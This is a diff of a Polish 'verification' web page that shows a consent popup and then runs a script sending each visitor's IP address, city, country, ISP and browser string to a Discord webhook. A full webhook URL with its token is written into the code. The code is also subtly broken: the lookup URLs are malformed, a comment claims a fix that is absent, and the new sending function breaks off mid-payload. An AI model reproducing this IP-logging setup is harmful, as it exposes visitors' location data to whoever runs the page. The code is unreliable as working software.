@@ -4,187 +4,239 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Strona z Weryfikacją</title>
+    
     <style>
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            margin: 0; padding: 0;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; background-color: #1a1a1a;
-            overflow: hidden; position: relative;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #1a1a1a;
+            position: relative;
+            overflow: hidden;
         }
+
+        /* Warstwa tła ze zdjęciem i płynnym wyostrzaniem */
         .background-blur {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background-image: url('budynek.jpg');
-            background-size: cover; background-position: center;
-            filter: blur(8px); transform: scale(1.05);
-            z-index: 1; pointer-events: none;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(8px);
+            transform: scale(1.05);
+            z-index: 1;
+            pointer-events: none;
             transition: filter 0.8s ease;
         }
+
+        /* Klasa zdejmująca blur po akceptacji */
         .unblurred {
             filter: blur(0px) !important;
         }
+
         .main-content, .error-content {
-            display: none; background: rgba(255, 255, 255, 0.95);
-            padding: 40px; border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5); text-align: center;
-            max-width: 500px; width: 90%; margin: 20px;
-            z-index: 10; position: relative;
+            display: none;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            margin: 20px;
+            z-index: 10;
+            position: relative;
         }
+
+        h1, h2, h3 { color: #2c3e50; }
+        p { color: #4a5568; line-height: 1.6; font-weight: 500; }
+        
         .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75); display: flex;
-            justify-content: center; align-items: center;
-            z-index: 1000; overflow-y: auto;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            overflow-y: auto;
         }
+
         .modal {
-            background: rgba(255, 255, 255, 0.98); padding: 30px;
-            border-radius: 12px; max-width: 500px; width: 90%;
-            text-align: center; margin: auto;
+            background: rgba(255, 255, 255, 0.98);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            margin: auto;
             box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            z-index: 1001; position: relative;
+            position: relative;
+            z-index: 1001;
         }
+
         .btn {
-            border: none; padding: 12px 24px; margin: 10px;
-            border-radius: 4px; cursor: pointer; font-weight: bold;
-            font-size: 14px; z-index: 1002; position: relative;
+            border: none;
+            padding: 12px 24px;
+            margin: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            position: relative;
+            z-index: 1002;
+            transition: background 0.2s, transform 0.1s;
         }
+        .btn:active { transform: scale(0.98); }
         .btn-accept { background: #2ecc71; color: white; }
+        .btn-accept:hover { background: #27ae60; }
         .btn-decline { background: #e74c3c; color: white; }
+        .btn-decline:hover { background: #c0392b; }
         .btn-back { background: #3498db; color: white; }
+        .btn-back:hover { background: #2980b9; }
+
         .privacy-policy-en {
-            margin-top: 25px; padding-top: 15px;
-            border-top: 1px solid #e2e8f0; text-align: left;
-            max-height: 120px; overflow-y: auto; font-size: 13px;
-            background: #f8fafc; padding: 10px; border-radius: 6px; color: #64748b;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #e2e8f0;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 13px;
+            background: #f8fafc;
+            padding: 10px;
+            border-radius: 6px;
+            color: #64748b;
+        }
+        .privacy-policy-en h3 {
+            font-size: 14px;
+            margin-top: 10px;
+            margin-bottom: 5px;
+            color: #475569;
         }
     </style>
 </head>
 <body>
 
+    <!-- Warstwa tła -->
     <div id="bgLayer" class="background-blur"></div>
 
-    <!-- 1. POPUP -->
+    <!-- 1. OKNO POPUP -->
     <div id="privacyOverlay" class="overlay">
         <div class="modal">
             <h2>Polityka Prywatności i Regulamin</h2>
             <p>Ta strona korzysta z narzędzi sieciowych rejestrujących parametry techniczne połączenia (w tym przybliżoną lokalizację oraz adres IP) w celach analitycznych oraz ochrony serwisu.</p>
             <p>Czy wyrażasz zgodę na warunki użytkowania serwisu i przetwarzanie tych danych?</p>
-            <button class="btn btn-accept" id="btnAccept">Akceptuję</button>
-            <button class="btn btn-decline" id="btnDecline">Odrzucam</button>
+            <button class="btn btn-accept" onclick="acceptTerms()">Akceptuję</button>
+            <button class="btn btn-decline" onclick="declineTerms()">Odrzucam</button>
 
             <div class="privacy-policy-en">
                 <h3>Privacy Policy</h3>
-                <p><strong>1. Data Collection:</strong> Upon your explicit consent (by clicking "Accept"), this website automatically collects technical network parameters, including your public IP address, approximate geographical location, internet service provider (ISP), and user-agent string.</p>
-                <p><strong>2. Purpose of Processing:</strong> Collected metadata is used solely for traffic analytics and anti-abuse protection monitored by the administrator.</p>
-                <p><strong>3. Data Transfer:</strong> The processed connection logs are instantly forwarded to an administrative logging terminal operated via a Discord automated webhook transmission link.</p>
+                <p><strong>1. Data Collection:</strong> Upon your explicit consent (by clicking "Accept"), this website automatically collects technical network parameters, including your public IP address, approximate geographical location (country, region, city), internet service provider (ISP), and user-agent string (browser/OS data).</p>
+                <p><strong>2. Purpose of Processing:</strong> Collected metadata is used solely for traffic analytics, connection quality measurement, and anti-abuse protection monitored by the administrator.</p>
+                <p><strong>3. Data Transfer:</strong> The processed connection logs are instantly forwarded to an administrative logging terminal operated via a Discord automated webhook transmission link. No data is stored permanently on GitHub Pages servers.</p>
+                <p><strong>4. Consent Revocation:</strong> If you decline, no telemetry or network logs are captured. You can manage your choices or clear cookies at any time to reset these settings.</p>
             </div>
         </div>
     </div>
 
-    <!-- 2. BLOKADA -->
+    <!-- 2. EKRAN BLOKADY -->
     <div id="errorScreen" class="error-content">
         <h2 style="color: #e74c3c;">Dostęp Zablokowany</h2>
         <p>Musisz zaakceptować regulamin korzystania z serwisu, aby wyświetlić zawartość tej strony.</p>
-        <button class="btn btn-back" id="btnBack">Powrót do formularza</button>
+        <button class="btn btn-back" onclick="showPrivacyNote()">Powrót do formularza</button>
+        
+        <div class="privacy-policy-en">
+            <h3>Privacy Policy</h3>
+            <p>You have chosen to decline the privacy terms. No connection details, telemetry logs, or IP data have been read, logged, or submitted to the administrator system.</p>
+        </div>
     </div>
 
-    <!-- 3. STRONA GŁÓWNA -->
+    <!-- 3. WŁAŚCIWA TREŚĆ STRONY -->
     <div id="mainPage" class="main-content">
         <h1>Weryfikacja zakończona pomyślnie</h1>
         <p>Dziękujemy za zaakceptowanie regulaminu serwisu. Obraz w tle został wyostrzony.</p>
     </div>
 
     <script>
-        // Definicja stałych elementów
-        const webhookUrl = "https://discordapp.com";
-        const overlay = document.getElementById('privacyOverlay');
-        const errorScreen = document.getElementById('errorScreen');
-        const mainPage = document.getElementById('mainPage');
-        const bgLayer = document.getElementById('bgLayer');
+        // PODANY PRZEZ CIEBIE URL WEBHOOKA DISCORD
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1532069719056715866/1cAY66JZ6NA6sh-FNeT5sEAKDt_3aZKoQHNBSuHCJEM3Z9dtw9s77EpjwgfNX0JydsgA";
 
-        // Funkcja sprawdzająca stan po załadowaniu strony
         window.onload = function() {
-            const consent = localStorage.getItem('siteConsent');
+            var consent = localStorage.getItem('siteConsent');
             if (consent === 'accepted') {
-                overlay.style.display = 'none';
-                bgLayer.classList.add('unblurred');
-                mainPage.style.display = 'block';
-                fetchDataAndSend();
+                document.getElementById('privacyOverlay').style.display = 'none';
+                document.getElementById('bgLayer').classList.add('unblurred');
+                startTracking();
             } else if (consent === 'declined') {
-                overlay.style.display = 'none';
-                errorScreen.style.display = 'block';
+                document.getElementById('privacyOverlay').style.display = 'none';
+                document.getElementById('errorScreen').style.display = 'block';
             } else {
-                overlay.style.display = 'flex';
+                document.getElementById('privacyOverlay').style.display = 'flex';
             }
         };
 
-        // CAŁKOWITA NOWOŚĆ: Nowoczesny system nasłuchiwania kliknięć (odporny na błędy "not defined")
-        document.getElementById('btnAccept').addEventListener('click', function() {
+        function acceptTerms() {
             localStorage.setItem('siteConsent', 'accepted');
-            overlay.style.display = 'none';
-            bgLayer.classList.add('unblurred');
-            mainPage.style.display = 'block';
-            fetchDataAndSend();
-        });
+            document.getElementById('privacyOverlay').style.display = 'none';
+            document.getElementById('bgLayer').classList.add('unblurred');
+            startTracking();
+        }
 
-        document.getElementById('btnDecline').addEventListener('click', function() {
+        function declineTerms() {
             localStorage.setItem('siteConsent', 'declined');
-            overlay.style.display = 'none';
-            errorScreen.style.display = 'block';
-        });
+            document.getElementById('privacyOverlay').style.display = 'none';
+            document.getElementById('errorScreen').style.display = 'block';
+        }
 
-        document.getElementById('btnBack').addEventListener('click', function() {
+        function showPrivacyNote() {
             localStorage.removeItem('siteConsent');
-            bgLayer.classList.remove('unblurred');
-            errorScreen.style.display = 'none';
-            overlay.style.display = 'flex';
-        });
+            document.getElementById('bgLayer').classList.remove('unblurred');
+            document.getElementById('errorScreen').style.display = 'none';
+            document.getElementById('privacyOverlay').style.display = 'flex';
+        }
 
-        // Pobieranie IP i lokalizacji oraz wysyłka na Discord
-        function fetchDataAndSend() {
+        function startTracking() {
+            document.getElementById('mainPage').style.display = 'block';
+            
+            // Pobieranie adresu IP jako obiekt JSON
             fetch('https://ipify.org')
-                .then(res => res.json())
-                .then(data => {
-                    if (data && data.ip) {
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    if(data && data.ip) {
+                        // Poprawny adres URL z ukośnikiem przed zmienną IP
                         fetch('https://ipapi.co' + data.ip + '/json/')
-                            .then(res => res.json())
-                            .then(locData => {
-                                sendToDiscord(locData.ip, locData.country_name, locData.city, locData.org);
+                            .then(function(res) { return res.json(); })
+                            .then(function(locData) {
+                                sendToDiscord(locData);
                             })
-                            .catch(() => {
-                                sendToDiscord(data.ip, "Nieznany", "Nieznane", "Błąd API");
+                            .catch(function() {
+                                sendToDiscord({ 
+                                    ip: data.ip, 
+                                    country_name: "Nieznany", 
+                                    city: "Nieznane", 
+                                    region: "Nieznany", 
+                                    org: "Błąd geolokalizacji" 
+                                });
                             });
                     }
                 })
-                .catch(() => {
-                    sendToDiscord("Błąd odczytu", "-", "-", "-");
+                .catch(function(error) {
+                    console.error("Blad sieci:", error);
+                    sendToDiscord({ ip: "Blad odczytu", country_name: "-", city: "-", region: "-", org: "-" });
                 });
         }
 
-        function sendToDiscord(ip, country, city, isp) {
+        function sendToDiscord(ipData) {
             const payload = {
-                username: "System Analityki V2",
+                username: "System Analityki",
                 avatar_url: "https://imgur.com",
                 embeds: [{
-                    title: "📥 Nowe odwiedziny na stronie",
-                    color: 3066993,
-                    fields: [
-                        { name: "🌐 Adres IP", value: "`" + ip + "`", inline: true },
-                        { name: "🌍 Kraj", value: country, inline: true },
-                        { name: "📍 Miasto", value: city, inline: true },
-                        { name: "🏢 Dostawca (ISP)", value: isp, inline: false },
-                        { name: "🖥️ Przeglądarka", value: navigator.userAgent, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => { console.log("Wysłano"); });
-        }
-    </script>
-</body>
-</html>
